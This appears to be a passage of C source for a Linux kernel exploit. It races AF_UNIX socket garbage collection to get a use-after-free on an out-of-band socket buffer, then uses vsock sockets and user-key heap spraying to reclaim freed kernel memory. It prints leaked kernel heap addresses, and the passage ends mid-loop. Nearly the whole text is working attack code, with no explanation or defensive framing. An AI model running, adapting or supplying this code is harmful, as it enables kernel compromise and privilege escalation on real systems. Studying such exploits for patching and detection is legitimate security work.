#include "exploit.hpp"

void unix_error(const char *msg)
{
	fprintf(stderr, "%s: %s\n", msg, strerror(errno));
	exit(EXIT_FAILURE);
}

void Pthread_error(const char *msg, int error_code)
{
	fprintf(stderr, "%s: %s\n", msg, strerror(error_code));
	exit(EXIT_FAILURE);
}

int Socket(int domain, int type, int protocol)
{
	int fd = socket(domain, type, protocol);
	if (fd < 0)
		unix_error("socket");

	return fd;
}

void Socketpair(int domain, int type, int protocol, int socket_vector[2])
{
	if (socketpair(domain, type, protocol, socket_vector) < 0)
		unix_error("socketpair");
}

void Setsockopt(int sockfd, int level, int optname, const void *optval, socklen_t optlen)
{
	if (setsockopt(sockfd, level, optname, optval, optlen) < 0)
		unix_error("setsockopt");
}

void Connect(int sockfd, const struct sockaddr *addr, socklen_t addrlen)
{
	if (connect(sockfd, addr, addrlen) < 0)
		unix_error("connect");
}

void Bind(int sockfd, const struct sockaddr *addr, socklen_t addrlen)
{
	if (bind(sockfd, addr, addrlen) < 0)
		unix_error("bind");
}

void Getsockname(int sockfd, struct sockaddr *addr, socklen_t *addrlen)
{
	if (getsockname(sockfd, addr, addrlen) < 0)
		unix_error("getsockname");
}

void Listen(int sockfd, int backlog)
{
	if (listen(sockfd, backlog) < 0)
		unix_error("listen");
}

int Accept(int sockfd, struct sockaddr *addr, socklen_t *addrlen)
{
	int new_sockfd = accept(sockfd, addr, addrlen);
	if (new_sockfd < 0)
		unix_error("accept");
	
	return new_sockfd;
}

ssize_t Sendmsg(int socket, const struct msghdr *message, int flags)
{
	ssize_t ret = sendmsg(socket, message, flags);
	if (ret < 0)
		unix_error("sendmsg");
	
	return ret;
}

ssize_t Recvmsg(int socket, struct msghdr *message, int flags)
{
	ssize_t ret = recvmsg(socket, message, flags);
	if (ret < 0)
		unix_error("recvmsg");

	return ret;
}

ssize_t Send(int sockfd, const void *buf, size_t size, int flags)
{
	ssize_t ret = send(sockfd, buf, size, flags);
	if (ret < 0)
		unix_error("send");

	return ret;
}

ssize_t Sendto(int sockfd, const void *msg, size_t length, int flags, const struct sockaddr *dst_addr, socklen_t dst_len)
{
	ssize_t ret = sendto(sockfd, msg, length, flags, dst_addr, dst_len);
	if (ret < 0)
		unix_error("sendto");
	
	return ret;
}

ssize_t Recv(int sockfd, void *buf, size_t size, int flags)
{
	ssize_t ret = recv(sockfd, buf, size, flags);
	if (ret < 0)
		unix_error("recv");
	
	return ret;
}

void *Calloc(size_t nelem, size_t elsize)
{
	void *p = calloc(nelem, elsize);
	if (p == NULL)
		unix_error("calloc");

	return p;
}

void Close(int fd)
{
	if (close(fd) < 0)
		unix_error("close");
}

void Ioctl(int fd, unsigned long op, unsigned long arg)
{
	if (ioctl(fd, op, arg) < 0)
		unix_error("ioctl");
}

void Unshare(int flags)
{
	if (unshare(flags) < 0)
		unix_error("unshare");
}

void Getrlimit(int resource, struct rlimit *rlim)
{
	if (getrlimit(resource, rlim) < 0)
		unix_error("getrlimit");
}

void Setrlimit(int resource, const struct rlimit *rlim)
{
	if (setrlimit(resource, rlim) < 0)
		unix_error("setrlimit");
}

void Sched_setaffinity(pid_t pid, size_t cpusetsize, const cpu_set_t *cpuset)
{
	if (sched_setaffinity(pid, cpusetsize, cpuset) < 0)
		unix_error("sched_setaffinity");
}

void Pthread_create(pthread_t *newthread, const pthread_attr_t *attr, void *(*start_routine) (void *), void *arg)
{
	int ret = pthread_create(newthread, attr, start_routine, arg);
	if (ret != 0)
		Pthread_error("pthread_create", ret);
}

void Pthread_join(pthread_t thread, void **retval)
{
	int ret = pthread_join(thread, retval);
	if (ret != 0)
		Pthread_error("pthread_join", ret);
}

void Pthread_setaffinity_np(pthread_t thread, size_t cpusetsize, const cpu_set_t *cpuset)
{
	int ret = pthread_setaffinity_np(thread, cpusetsize, cpuset);
	if (ret != 0)
		Pthread_error("pthread_setaffinity_np", ret);
}

void pin_thread_on_cpu(int cpu)
{
	cpu_set_t cpuset;
	CPU_ZERO(&cpuset);
	CPU_SET(cpu, &cpuset);

	pthread_t current_thread = pthread_self();
	Pthread_setaffinity_np(current_thread, sizeof(cpu_set_t), &cpuset);
}

void sendfds(
        int unix_sockfd,
        void *data,
        size_t data_len,
        int *fds,
        int fds_len,
        struct sockaddr_un addr,
        socklen_t addrlen
)
{
	assert(fds_len <= SCM_MAX_FD);
	union {
		char buf[CMSG_SPACE(sizeof(int) * SCM_MAX_FD)];
		struct cmsghdr align;
	} control_msg;

	struct msghdr msgh = {};
	struct iovec iov = {};

	iov.iov_base = data;
	iov.iov_len = data_len;
	msgh.msg_iov = &iov;
	msgh.msg_iovlen = 1;

	msgh.msg_control = control_msg.buf;
	msgh.msg_controllen = CMSG_SPACE(sizeof(int) * fds_len);

	struct cmsghdr *cmsgp = CMSG_FIRSTHDR(&msgh);
	cmsgp->cmsg_level = SOL_SOCKET;
	cmsgp->cmsg_type = SCM_RIGHTS;
	cmsgp->cmsg_len = CMSG_LEN(sizeof(int) * fds_len);
	memcpy(CMSG_DATA(cmsgp), fds, sizeof(int) * fds_len);

	if (addrlen) {
		msgh.msg_name = &addr;
		msgh.msg_namelen = addrlen;
	}

	Sendmsg(unix_sockfd, &msgh, 0);
}

void recvfds(int unix_sockfd, void *data, size_t data_len, int *fds, int fds_len, int msg_peek)
{
	struct msghdr msgh = {};
	struct iovec iov = {};
	size_t msg_controllen = CMSG_SPACE(fds_len * sizeof(int));
	void *msg_control = Calloc(1, msg_controllen);

	iov.iov_base = data;
	iov.iov_len = data_len;
	msgh.msg_iov = &iov;
	msgh.msg_iovlen = 1;
	msgh.msg_control = msg_control;
	msgh.msg_controllen = msg_controllen;
	Recvmsg(unix_sockfd, &msgh, msg_peek);

	struct cmsghdr *cmsgp = CMSG_FIRSTHDR(&msgh);
	if (cmsgp == NULL ||
		cmsgp->cmsg_len != CMSG_LEN(fds_len * sizeof(int)) ||
		cmsgp->cmsg_type != SCM_RIGHTS)
			exit(EXIT_FAILURE);

	memcpy(fds, CMSG_DATA(cmsgp), fds_len * sizeof(int));
	free(msg_control);
}

void *unix_gc_thread_fn(void *arg)
{
	pin_thread_on_cpu(1);
	struct unix_gc_thread *t = (struct unix_gc_thread *)arg;

	for ( ;; ) {
		pthread_mutex_lock(&t->mutex);
		while (!t->quit && !t->trigger_gc)
			pthread_cond_wait(&t->cond, &t->mutex);

		t->trigger_gc = false;
		bool quit = t->quit;
		pthread_mutex_unlock(&t->mutex);

		if (quit)
			break;

		union {
			char buf[CMSG_SPACE(sizeof(int))];
			struct cmsghdr align;
		} control_msg;

		int dummy_data = 0;
		struct iovec iov = { .iov_base = &dummy_data, .iov_len = sizeof(int) };

		struct msghdr msgh = {
			.msg_iov = &iov,
			.msg_iovlen = 1,
			.msg_control = control_msg.buf,
			.msg_controllen = CMSG_SPACE(sizeof(int)),
			//.msg_flags = MSG_OOB
		};

		struct cmsghdr *cmsgp = CMSG_FIRSTHDR(&msgh);
		cmsgp->cmsg_level = SOL_SOCKET;
		cmsgp->cmsg_type = SCM_RIGHTS;
		cmsgp->cmsg_len = CMSG_LEN(sizeof(int));
		memcpy(CMSG_DATA(cmsgp), &t->wait_for_gc_fd, sizeof(int));

		Close(t->trigger_gc_fd);
		int ret = sendmsg(t->wait_for_gc_fd, &msgh, MSG_OOB);
		if (!(ret == -1 && errno == EOPNOTSUPP)) {
			fprintf(stderr, "Kernel function unix_dgram_sendmsg() implementation changed\n");
			exit(EXIT_FAILURE);
		}

		t->trigger_gc_fd = Socket(AF_UNIX, SOCK_DGRAM, 0);

		pthread_mutex_lock(&t->mutex);
		t->gc_complete = true;
		pthread_cond_signal(&t->cond);
		pthread_mutex_unlock(&t->mutex);
	}

	return NULL;
}

void unix_gc_trigger(struct unix_gc_thread *t)
{
	pthread_mutex_lock(&t->mutex);
	t->trigger_gc = true;
	pthread_cond_signal(&t->cond);
	pthread_mutex_unlock(&t->mutex);
}

void unix_gc_wait(struct unix_gc_thread *t)
{
	pthread_mutex_lock(&t->mutex);
	while (!t->gc_complete)
		pthread_cond_wait(&t->cond, &t->mutex);

	t->gc_complete = false;
	pthread_mutex_unlock(&t->mutex);
}

void unix_gc_thread_quit(struct unix_gc_thread *t)
{
	pthread_mutex_lock(&t->mutex);
	t->quit = true;
	pthread_cond_signal(&t->cond);
	pthread_mutex_unlock(&t->mutex);
}

void unix_gc_thread_init(struct unix_gc_thread *t)
{
	t->trigger_gc_fd = Socket(AF_UNIX, SOCK_DGRAM, 0);
	t->wait_for_gc_fd = Socket(AF_UNIX, SOCK_DGRAM, 0);
	pthread_mutex_init(&t->mutex, NULL);
	pthread_cond_init(&t->cond, NULL);
	Pthread_create(&t->handle, NULL, unix_gc_thread_fn, t);
}

void unix_gc_thread_cleanup(struct unix_gc_thread *t)
{
	unix_gc_thread_quit(t);
	pthread_cond_destroy(&t->cond);
	pthread_mutex_destroy(&t->mutex);	
}

void exploit_kernel_unix_graph_prepare(struct exploit_kernel_unix_graph *p)
{
	p->stream_unix_socket_A_fd = Socket(AF_UNIX, SOCK_STREAM, 0);
	p->stream_unix_socket_B_fd = Socket(AF_UNIX, SOCK_STREAM, 0);
	p->stream_unix_socket_C_fd = -1;
	p->dgram_unix_socket_D_fd = Socket(AF_UNIX, SOCK_DGRAM, 0);

	struct sockaddr_un auto_bind_addr = { .sun_family = AF_UNIX };
	Bind(
		p->stream_unix_socket_A_fd,
		(const struct sockaddr *)&auto_bind_addr,
		offsetof(struct sockaddr_un, sun_path)
	);
	Bind(
		p->stream_unix_socket_B_fd,
		(const struct sockaddr *)&auto_bind_addr,
		offsetof(struct sockaddr_un, sun_path)
	);
	Bind(
		p->dgram_unix_socket_D_fd,
		(const struct sockaddr *)&auto_bind_addr,
		offsetof(struct sockaddr_un, sun_path)
	);

	Listen(p->stream_unix_socket_A_fd, 1);

	struct sockaddr_un socket_A_addr = {};
	socklen_t socket_A_addrlen = sizeof(socket_A_addr);
	Getsockname(p->stream_unix_socket_A_fd, (struct sockaddr *)&socket_A_addr, &socket_A_addrlen);
	Connect(p->stream_unix_socket_B_fd, (const struct sockaddr *)&socket_A_addr, socket_A_addrlen);
}

void exploit_kernel_unix_graph_build_stage_1(struct exploit_kernel_unix_graph *p)
{
	u8 dummy = 0;
	sendfds(
		p->stream_unix_socket_B_fd,
		&dummy,
		sizeof(dummy),
		(int *)&p->stream_unix_socket_B_fd,
		1,
		(struct sockaddr_un){},
		0
	);
}

void exploit_kernel_unix_graph_build_stage_2(struct exploit_kernel_unix_graph *p)
{
	p->stream_unix_socket_C_fd = Accept(p->stream_unix_socket_A_fd, NULL, NULL);
	u8 dummy = 0;

	struct sockaddr_un dst_addr = {};
	socklen_t dst_len = sizeof(dst_addr);
	Getsockname(p->dgram_unix_socket_D_fd, (struct sockaddr *)&dst_addr, &dst_len);

	sendfds(
		p->dgram_unix_socket_D_fd,
		&dummy,
		sizeof(dummy),
		(int *)&p->stream_unix_socket_C_fd,
		1,
		dst_addr,
		dst_len
	);
}

void exploit_kernel_unix_graph_cleanup(struct exploit_kernel_unix_graph *p)
{
	if (p->stream_unix_socket_A_fd != -1) {
		Close(p->stream_unix_socket_A_fd);
		p->stream_unix_socket_A_fd = -1;
	}

	if (p->stream_unix_socket_B_fd != -1) {
		Close(p->stream_unix_socket_B_fd);
		p->stream_unix_socket_B_fd = -1;
	}

	if (p->stream_unix_socket_C_fd != -1) {
		Close(p->stream_unix_socket_C_fd);
		p->stream_unix_socket_C_fd = -1;
	}

	if (p->dgram_unix_socket_D_fd != -1) {
		Close(p->dgram_unix_socket_D_fd);
		p->dgram_unix_socket_D_fd = -1;
	}
}

void cyclic_kernel_unix_graph_prepare(struct cyclic_kernel_unix_graph *p)
{
	p->dgram_unix_socket_fd = Socket(AF_UNIX, SOCK_DGRAM, 0);
	struct sockaddr_un addr = { .sun_family = AF_UNIX };
	Bind(p->dgram_unix_socket_fd, (const struct sockaddr *)&addr, offsetof(struct sockaddr_un, sun_path));
}

void cyclic_kernel_unix_graph_build(struct cyclic_kernel_unix_graph *p)
{
	u8 dummy = 0;

	struct sockaddr_un dst_addr = {};
	socklen_t dst_len = sizeof(dst_addr);
	Getsockname(p->dgram_unix_socket_fd, (struct sockaddr *)&dst_addr, &dst_len);

	sendfds(
		p->dgram_unix_socket_fd,
		&dummy,
		sizeof(dummy),
		&p->dgram_unix_socket_fd,
		1,
		dst_addr,
		dst_len
	);
}

void cyclic_kernel_unix_graph_cleanup(struct cyclic_kernel_unix_graph *p)
{
	if (p->dgram_unix_socket_fd != -1) {
		Close(p->dgram_unix_socket_fd);
		p->dgram_unix_socket_fd = -1;
	}
}

void kernel_unix_vertex_spray_prepare(struct kernel_unix_vertex_spray *p, int spray_count)
{
	p->dgram_unix_socket_fds = (int *)Calloc(spray_count, sizeof(*p->dgram_unix_socket_fds));
	for (int i = 0; i < spray_count; i++) {
		p->dgram_unix_socket_fds[i] = Socket(AF_UNIX, SOCK_DGRAM, 0);
		struct sockaddr_un addr = {. sun_family = AF_UNIX };
		Bind(p->dgram_unix_socket_fds[i], (const struct sockaddr *)&addr, offsetof(struct sockaddr_un, sun_path));
	}

	p->vertex_count = spray_count;
}

void kernel_unix_vertex_spray_trigger_alloc(struct kernel_unix_vertex_spray *p)
{
	u8 dummy = 0;
	for (int i = 0; i < p->vertex_count; i++) {
		if (i != p->vertex_count - 1) {
			struct sockaddr_un dst_addr = {};
			socklen_t dst_len = sizeof(dst_addr);
			Getsockname(p->dgram_unix_socket_fds[i + 1], (struct sockaddr *)&dst_addr, &dst_len);
			
			sendfds(
				p->dgram_unix_socket_fds[i],
				&dummy,
				sizeof(dummy),
				(int *)&p->dgram_unix_socket_fds[i],
				1,
				dst_addr,
				dst_len
			);
		} else {
			struct sockaddr_un dst_addr = {};
			socklen_t dst_len = sizeof(dst_addr);
			Getsockname(p->dgram_unix_socket_fds[0], (struct sockaddr *)&dst_addr, &dst_len);

			sendfds(
				p->dgram_unix_socket_fds[i],
				&dummy,
				sizeof(dummy),
				(int *)&p->dgram_unix_socket_fds[i],
				1,
				dst_addr,
				dst_len
			);
		}
	}
}

void kernel_unix_vertex_spray_trigger_free(struct kernel_unix_vertex_spray *p)
{
	u8 dummy = 0;
	int tmp_fd = -1;

	for (int i = 0; i < p->vertex_count; i++) {
		recvfds(
			p->dgram_unix_socket_fds[i],
			&dummy,
			sizeof(dummy),
			&tmp_fd,
			1,
			0
		);

		Close(tmp_fd);
	}
}

void kernel_unix_vertex_spray_cleanup(struct kernel_unix_vertex_spray *p)
{
	for (int i = 0; i < p->vertex_count; i++) {
		if (p->dgram_unix_socket_fds[i] != -1) {
			Close(p->dgram_unix_socket_fds[i]);
			p->dgram_unix_socket_fds[i] = -1;
		}
	}

	free(p->dgram_unix_socket_fds);
}

void prepare_uaf(
	struct exploit_kernel_unix_graph *exploit_kernel_unix_graph,
	struct cyclic_kernel_unix_graph *cyclic_kernel_unix_graph,
	struct kernel_unix_vertex_spray *kernel_unix_vertex_spray,
	struct unix_gc_thread *unix_gc_thread
)
{
	kernel_unix_vertex_spray_trigger_alloc(kernel_unix_vertex_spray);
	unix_gc_trigger(unix_gc_thread);
	unix_gc_wait(unix_gc_thread);
	kernel_unix_vertex_spray_trigger_free(kernel_unix_vertex_spray);

	exploit_kernel_unix_graph_build_stage_1(exploit_kernel_unix_graph);
	cyclic_kernel_unix_graph_build(cyclic_kernel_unix_graph);
	unix_gc_trigger(unix_gc_thread);
	unix_gc_wait(unix_gc_thread);

	exploit_kernel_unix_graph_build_stage_2(exploit_kernel_unix_graph);
	
	u8 detect_byte = UAF_OOB_SKB_BYTE_DATA;
	Send(
		exploit_kernel_unix_graph->stream_unix_socket_C_fd,
		&detect_byte,
		sizeof(detect_byte),
		MSG_OOB
	);
}

bool trigger_uaf(
	struct exploit_kernel_unix_graph *exploit_kernel_unix_graph,
	struct unix_gc_thread *unix_gc_thread
)
{
	Close(exploit_kernel_unix_graph->stream_unix_socket_B_fd);
	exploit_kernel_unix_graph->stream_unix_socket_B_fd = -1;

	unix_gc_trigger(unix_gc_thread);
	unix_gc_wait(unix_gc_thread);

	u8 dummy = 0;
	int stream_unix_socket_B_newfd = -1;
	recvfds(
		exploit_kernel_unix_graph->stream_unix_socket_C_fd,
		&dummy,
		sizeof(dummy),
		(int *)&stream_unix_socket_B_newfd,
		1,
		0
	);

	exploit_kernel_unix_graph->stream_unix_socket_B_fd = stream_unix_socket_B_newfd;
	return uaf_success(stream_unix_socket_B_newfd);
}

bool uaf_success(int victim_socket_fd)
{
	int inq_len = 0;
	Ioctl(victim_socket_fd, SIOCINQ, (unsigned long)&inq_len);

	u8 dummy = 0;
	int ret = recv(victim_socket_fd, &dummy, 1, MSG_OOB | MSG_PEEK);

	return (ret == 1 && inq_len == 0) || (ret == -1 && errno == EFAULT);
}

void setup_nofile_rlimit(void)
{
	struct rlimit nofile_rlimit = {};
	Getrlimit(RLIMIT_NOFILE, &nofile_rlimit);
	nofile_rlimit.rlim_cur = nofile_rlimit.rlim_max;
	Setrlimit(RLIMIT_NOFILE, &nofile_rlimit);
}

void vsock_autobind(int vsock_fd)
{
	struct sockaddr_vm addr = {};
	addr.svm_family = AF_VSOCK;
	addr.svm_cid = VMADDR_CID_LOCAL;
	addr.svm_port = VMADDR_PORT_ANY;
	
	int bind_ret = -1;
	bool bind_success = false;
	while (!bind_success) {
		bind_ret = bind(vsock_fd, (const struct sockaddr *)&addr, sizeof(addr));
		if (bind_ret == 0)
			bind_success = true;
	}	
}

void vsock_force_next_autobind_fail(int vsock_fds[MAX_PORT_RETRIES])
{
	int vsock_fd = Socket(AF_VSOCK, SOCK_STREAM, 0);
	vsock_autobind(vsock_fd);

	struct sockaddr_vm addr = {};
	socklen_t addr_len = sizeof(addr);
	Getsockname(vsock_fd, (struct sockaddr *)&addr, &addr_len);
	Close(vsock_fd);

	u32 static_port_value = addr.svm_port + 1;
	for (int i = 0; i < MAX_PORT_RETRIES; i++) {
		struct sockaddr_vm new_addr = {};
		new_addr.svm_family = AF_VSOCK;
		new_addr.svm_cid = VMADDR_CID_LOCAL;

		if (static_port_value == VMADDR_PORT_ANY || static_port_value <= LAST_RESERVED_PORT) {
			static_port_value = LAST_RESERVED_PORT + 1;
		}

		new_addr.svm_port = static_port_value++;
		
		bind(vsock_fds[i], (const struct sockaddr *)&new_addr, sizeof(new_addr));
	}
}

void uaf_oob_skb_reclaim_prepare(int vsockpair[2], key_serial_t keys[TOTAL_USER_KEY_PAYLOAD_1])
{
	int vsock_listener_fd = Socket(AF_VSOCK, SOCK_SEQPACKET, 0);
	vsock_autobind(vsock_listener_fd);
	Listen(vsock_listener_fd, 1);

	int vsock_A = Socket(AF_VSOCK, SOCK_SEQPACKET, 0);

	struct sockaddr_vm vsock_listener_addr = {};
	socklen_t vsock_listener_addr_len = sizeof(vsock_listener_addr);
	Getsockname(vsock_listener_fd, (struct sockaddr *)&vsock_listener_addr, &vsock_listener_addr_len);

	int vsock_fds[MAX_PORT_RETRIES] = {};
	for (int i = 0; i < MAX_PORT_RETRIES; i++)
		vsock_fds[i] = Socket(AF_VSOCK, SOCK_STREAM, 0);

	vsock_force_next_autobind_fail(vsock_fds);

	char user_key_payload_key_desc[128] = {};
	char user_key_payload_data[64] = {};

	//memset(user_key_payload_data, 0x41, 64);
	*(u32 *)(user_key_payload_data + SKB_LEN_OVERLAP_OFFSET) = 0;
	*(u32 *)(user_key_payload_data + UNIXCB_CONSUMED_OFFSET) = 0;
	*(u32 *)(user_key_payload_data + SKB_USERS_OFFSET) = 1;

	for (int i = 0; i < TOTAL_USER_KEY_PAYLOAD_1 / 2; i++) {
		snprintf(user_key_payload_key_desc, sizeof(user_key_payload_key_desc), "key1_%d", i);
		keys[i] = user_key_payload_alloc(user_key_payload_key_desc, user_key_payload_data, 64);
	}

	int ret = connect(vsock_A, (const struct sockaddr *)&vsock_listener_addr, vsock_listener_addr_len);
	assert(ret < 0 && errno == EADDRNOTAVAIL);

	for (int i = TOTAL_USER_KEY_PAYLOAD_1 / 2; i < TOTAL_USER_KEY_PAYLOAD_1; i++) {
		snprintf(user_key_payload_key_desc, sizeof(user_key_payload_key_desc), "key_%d", i);
		keys[i] = user_key_payload_alloc(user_key_payload_key_desc, user_key_payload_data, 64);
	}

	Connect(vsock_A, (const struct sockaddr *)&vsock_listener_addr, vsock_listener_addr_len);

	int vsock_B = Accept(vsock_listener_fd, NULL, NULL);

	vsockpair[VSOCKPAIR_SEND_SIDE] = vsock_B;
	vsockpair[VSOCKPAIR_RECV_SIDE] = vsock_A;

	for (int i = 0; i < MAX_PORT_RETRIES; i++)
		Close(vsock_fds[i]);

	Close(vsock_listener_fd);
}

void setup_uaf_oob_skb(struct unix_gc_thread *unix_gc_thread, int vsockpair[2], int *victim_unix_sockfd)
{
	bool overlap_success = false;
	while (!overlap_success) {
		struct cyclic_kernel_unix_graph cyclic_kernel_unix_graph = {};
		struct exploit_kernel_unix_graph exploit_kernel_unix_graph = {};
		struct kernel_unix_vertex_spray kernel_unix_vertex_spray = {};
		
		bool uaf_success = false;
		while (!uaf_success) {
			cyclic_kernel_unix_graph_prepare(&cyclic_kernel_unix_graph);
			exploit_kernel_unix_graph_prepare(&exploit_kernel_unix_graph);
			kernel_unix_vertex_spray_prepare(&kernel_unix_vertex_spray, 25);
			
			prepare_uaf(
				&exploit_kernel_unix_graph,
				&cyclic_kernel_unix_graph,
				&kernel_unix_vertex_spray,
				unix_gc_thread
			);

			uaf_success = trigger_uaf(&exploit_kernel_unix_graph, unix_gc_thread);

			if (!uaf_success) {
				cyclic_kernel_unix_graph_cleanup(&cyclic_kernel_unix_graph);
				exploit_kernel_unix_graph_cleanup(&exploit_kernel_unix_graph);
				kernel_unix_vertex_spray_cleanup(&kernel_unix_vertex_spray);
			}		
		}

		fprintf(stderr, "uaf success\n");

		int total_skb = 0;
		for (int i = 0; i < 256 && !overlap_success; i++) {
			u8 send_byte = RECLAIM_UAF_OOB_SKB_BYTE_DATA_1;
			Send(vsockpair[VSOCKPAIR_SEND_SIDE], &send_byte, 1, 0);
			total_skb++;

			u8 recv_byte = 0;
			ssize_t recv_ret = recv(
				exploit_kernel_unix_graph.stream_unix_socket_B_fd,
				&recv_byte,
				1,
				MSG_OOB | MSG_PEEK
			);

			if (recv_ret == 1 && recv_byte == send_byte)
				overlap_success = true;
		}

		fprintf(stderr, "overlap_success: %d - total_skb: %d\n", overlap_success, total_skb);

		int free_skb = (overlap_success) ? total_skb - 1 : total_skb;
		while (free_skb) {
			u8 byte = 0;
			Recv(vsockpair[VSOCKPAIR_RECV_SIDE], &byte, 1, 0);
			free_skb--;
		}

		if (overlap_success) {
			*victim_unix_sockfd = exploit_kernel_unix_graph.stream_unix_socket_B_fd;
			exploit_kernel_unix_graph.stream_unix_socket_B_fd = -1;
		}

		cyclic_kernel_unix_graph_cleanup(&cyclic_kernel_unix_graph);
		exploit_kernel_unix_graph_cleanup(&exploit_kernel_unix_graph);
		kernel_unix_vertex_spray_cleanup(&kernel_unix_vertex_spray);
	}
}

int main(int argc, char *argv[])
{
	pin_thread_on_cpu(0);
	setup_nofile_rlimit();
	struct unix_gc_thread unix_gc_thread = {};
	unix_gc_thread_init(&unix_gc_thread);

	int vsock_listener_fd = Socket(AF_VSOCK, SOCK_STREAM, 0);
	vsock_autobind(vsock_listener_fd);
	Listen(vsock_listener_fd, 1);

	struct sockaddr_vm vsock_listener_addr = {};
	socklen_t vsock_listener_addr_len = sizeof(vsock_listener_addr);
	Getsockname(vsock_listener_fd, (struct sockaddr *)&vsock_listener_addr, &vsock_listener_addr_len);

	int reclaim_invalid_free_vsockpairs[256][2] = {};
	for (int i = 0; i < 256; i++) {
		reclaim_invalid_free_vsockpairs[i][0] = Socket(AF_VSOCK, SOCK_STREAM, 0);

		u64 buffer_max_size = 0xFFFFFFFF;
		Setsockopt(
			reclaim_invalid_free_vsockpairs[i][0],
			AF_VSOCK,
			SO_VM_SOCKETS_BUFFER_MAX_SIZE,
			&buffer_max_size,
			sizeof(buffer_max_size)
		);

		u64 buffer_min_size = 0;
		Setsockopt(
			reclaim_invalid_free_vsockpairs[i][0],
			AF_VSOCK,
			SO_VM_SOCKETS_BUFFER_MIN_SIZE,
			&buffer_min_size,
			sizeof(buffer_min_size)
		);

		u64 buffer_size = 0xFFFFFFFF;
		Setsockopt(
			reclaim_invalid_free_vsockpairs[i][0],
			AF_VSOCK,
			SO_VM_SOCKETS_BUFFER_SIZE,
			&buffer_size,
			sizeof(buffer_size)
		);
	}

	int vsockpair[2] = {};
	key_serial_t kmalloc_96_invalid_free_keys[TOTAL_USER_KEY_PAYLOAD_1] = {};
	uaf_oob_skb_reclaim_prepare(vsockpair, kmalloc_96_invalid_free_keys);

	int victim_unix_sockfd = -1;
	setup_uaf_oob_skb(&unix_gc_thread, vsockpair, &victim_unix_sockfd);

	//wait_for_inspection("Enter to trigger");
	u8 dummy = 0;
	recv(victim_unix_sockfd, &dummy, 1, MSG_OOB);

	key_serial_t lower_allocation_key;
	for (int i = 0; i < TOTAL_USER_KEY_PAYLOAD_1; i++) {
		long sz = keyctl_read(kmalloc_96_invalid_free_keys[i], NULL, 0);
		if (sz != 64) {
			lower_allocation_key = kmalloc_96_invalid_free_keys[i];
			fprintf(stderr, "sz: %ld\n", sz);
		} else {
			user_key_payload_free(kmalloc_96_invalid_free_keys[i]);
		}
	}

	sleep(1);

	for (int i = 0; i < 256; i++) {
		Connect(
			reclaim_invalid_free_vsockpairs[i][0],
			(const struct sockaddr *)&vsock_listener_addr,
			vsock_listener_addr_len
		);
		
		reclaim_invalid_free_vsockpairs[i][1] = Accept(vsock_listener_fd, NULL, NULL);

		u64 buffer_max_size = 0xFFFFFFFF;
		Setsockopt(
			reclaim_invalid_free_vsockpairs[i][1],
			AF_VSOCK,
			SO_VM_SOCKETS_BUFFER_MAX_SIZE,
			&buffer_max_size,
			sizeof(buffer_max_size)
		);

		u64 buffer_min_size = 0;
		Setsockopt(
			reclaim_invalid_free_vsockpairs[i][1],
			AF_VSOCK,
			SO_VM_SOCKETS_BUFFER_MIN_SIZE,
			&buffer_min_size,
			sizeof(buffer_min_size)
		);

		u64 buffer_size = 0xFFFFFFFF;
		Setsockopt(
			reclaim_invalid_free_vsockpairs[i][1],
			AF_VSOCK,
			SO_VM_SOCKETS_BUFFER_SIZE,
			&buffer_size,
			sizeof(buffer_size)
		);
	}

	int reclaim_side_sockfd = -1;
	int send_to_reclaim_side_sockfd = -1;
	bool reclaim_invalid_free_success = false;

	for (int i = 0; i < 256 && !reclaim_invalid_free_success; i++) {
		u8 tmp_buf[65536] = {};
		Send(reclaim_invalid_free_vsockpairs[i][0], tmp_buf, 65535, 0);

		long sz = keyctl_read(lower_allocation_key, NULL, 0);
		if (sz == 65535) {
			send_to_reclaim_side_sockfd = reclaim_invalid_free_vsockpairs[i][0];
			reclaim_invalid_free_vsockpairs[i][0] = -1;
			reclaim_side_sockfd = reclaim_invalid_free_vsockpairs[i][1];
			reclaim_invalid_free_vsockpairs[i][1] = -1;
			reclaim_invalid_free_success = true;
		} else {
			Send(reclaim_invalid_free_vsockpairs[i][1], tmp_buf, 65535, 0);

			sz = keyctl_read(lower_allocation_key, NULL, 0);
			if (sz == 65535) {
				Recv(reclaim_invalid_free_vsockpairs[i][1], tmp_buf, 65535, 0);

				send_to_reclaim_side_sockfd = reclaim_invalid_free_vsockpairs[i][1];
				reclaim_invalid_free_vsockpairs[i][1] = -1;
				reclaim_side_sockfd = reclaim_invalid_free_vsockpairs[i][0];
				reclaim_invalid_free_vsockpairs[i][0] = -1;
				reclaim_invalid_free_success = true;
			}
		}

		if (reclaim_invalid_free_success) {
			for (int j = 0; j < i; j++) {
				Recv(reclaim_invalid_free_vsockpairs[j][0], tmp_buf, 65535, 0);
				Recv(reclaim_invalid_free_vsockpairs[j][1], tmp_buf, 65535, 0);
			}
		}
	}

	if (!reclaim_invalid_free_success) {
		exit(0);
	}

	char leak_buf[65535] = {};
	keyctl_read(lower_allocation_key, leak_buf, 65535);

	u64 skb_addr = *(u64 *)(leak_buf + 8);
	u64 rx_queue_addr = *(u64 *)(leak_buf + 8 + 8);

	printf("[+] skb addr: 0x%016lx\n", skb_addr);
	printf("[+] rx_queue addr: 0x%016lx\n", rx_queue_addr);

	void *p96 = leak_buf + 96 - sizeof(struct user_key_payload);
	int remaining_bytes = 65535 - (96 - sizeof(struct user_key_payload));
	int kmalloc_96_obj_count = remaining_bytes / 96;

	bool found_two_adjacent_virtio_vsock_sock = false;
	struct virtio_vsock_sock *vvs_lower = NULL;
	struct virtio_vsock_sock *vvs_upper = NULL;
	u64 vvs_lower_heap_addr = 0;
	u64 vvs_upper_heap_addr = 0;
	u64 vvs_lower_vsk_addr = 0;
	u64 vvs_upper_vsk_addr = 0;
	u64 lower_allocation_user_key_payload_addr = 0;
	int vvs_lower_found_at_kmalloc_96_obj = -1;
	int vvs_upper_found_at_kmalloc_96_obj = -1;

	for (int i = 0; i < kmalloc_96_obj_count - 1 && !found_two_adjacent_virtio_vsock_sock; i++) {
		vvs_lower = (struct virtio_vsock_sock *)(p96 + i * 96);
		vvs_upper = (struct virtio_vsock_sock *)(p96 + (i + 1) * 96);
		if (	is_data_look_like_virtio_vsock_sock(vvs_lower) &&
			is_data_look_like_virtio_vsock_sock(vvs_upper)) {
			
			vvs_lower_heap_addr = (u64)(vvs_lower->rx_queue.next) - 64;
			vvs_upper_heap_addr = (u64)(vvs_upper->rx_queue.next) - 64;
			vvs_lower_vsk_addr = (u64)(vvs_lower->vsk);
			vvs_upper_vsk_addr = (u64)(vvs_upper->vsk);
			lower_allocation_user_key_payload_addr = vvs_lower_heap_addr - ((i + 1) * 96);
